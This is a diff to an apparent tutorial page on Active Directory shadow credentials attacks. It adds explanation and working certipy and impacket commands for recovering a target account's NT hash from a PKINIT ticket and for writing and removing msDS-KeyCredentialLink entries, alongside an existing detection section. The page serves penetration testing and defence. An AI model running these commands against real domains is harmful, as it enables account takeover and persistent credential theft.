@@ -114,6 +114,30 @@ This enables scenarios like:
 4. Create a Kerberos PKINIT pre-authentication backdoor
 5. Maintain persistent access to DC01 with PKINIT and pass-the-cache
 
+## Recovering the NT Hash from a PKINIT TGT
+
+A shadow credentials attack does not only return a ticket. It usually returns the target account's **NT hash** as well, which is worth understanding because it is what turns a one-shot ticket into a reusable credential.
+
+When a TGT is issued through PKINIT, the KDC adds a `PAC_CREDENTIAL_INFO` buffer to the ticket's PAC. That buffer carries the account's NTLM secret, encrypted under the AS reply key. It exists for a legitimate reason: a user who authenticates with a smartcard or with Windows Hello never types a password, so without it they could never reach a service that only speaks NTLM. The KDC hands the NTLM secret to the client so the client can perform NTLM authentication on its own behalf.
+
+An attacker holding a PKINIT TGT holds the AS reply key too, so the buffer decrypts. The NT hash comes out of Kerberos itself, with **no DCSync, no NTDS access, and no LSASS touch**.
+
+Two ways to do it in practice:
+
+```bash
+# Certipy performs the decryption automatically after PKINIT
+certipy auth -pfx target.pfx -dc-ip '<DC-IP>'
+```
+
+```bash
+# Impacket, when you already have the ccache and the AS-REP key
+# (a User-to-User AP-REQ is used to unwrap the PAC)
+KRB5CCNAME=target.ccache getnthash.py -key '<AS-REP-key>' '<DOMAIN>/<target>'
+```
+
+> This is why `msDS-KeyCredentialLink` write is scored as a full account takeover rather than as temporary ticket access. The ticket expires in ten hours, the NT hash does not, and the attribute can be reverted afterwards leaving nothing behind.
+{: .prompt-danger}
+
 ## Detection Methods
 
 ### Event Log Monitoring
@@ -229,10 +253,22 @@ bloodyAD -d domain.com --host 10.10.10.10 -u user -p password remove shadowCrede
 ```
 
 #### certipy shadow
-```bash
-# Automatically add shadow credentials and request certificate
-certipy shadow -dc-ip 10.10.10.10 -u user -p password -account target_account auto
 
+`certipy shadow auto` runs the entire loop in one command: generate a key pair, append the Key Credential to the target's `msDS-KeyCredentialLink`, PKINIT for a TGT, decrypt `PAC_CREDENTIAL_INFO` to recover the NT hash, and then **restore the attribute's original value**.
+
+```bash
+# Full loop, including the restore
+certipy shadow -dc-ip 10.10.10.10 -u user -p password -account target_account auto
+```
+
+The restore is what makes the technique quiet, but it is also the risk. If the target has a legitimate Windows Hello enrollment and the run dies between the write and the restore, the real user loses PIN and biometric logon. On an engagement, split the loop so the restore is an explicit step you control:
+
+```bash
+certipy shadow -dc-ip 10.10.10.10 -u user -p password -account target_account list
+certipy shadow -dc-ip 10.10.10.10 -u user -p password -account target_account add
+# ... authenticate, then clean up with the DeviceID printed by 'add'
+certipy shadow -dc-ip 10.10.10.10 -u user -p password -account target_account \
+    -device-id '<device-id>' remove
 ```
 
 ## References
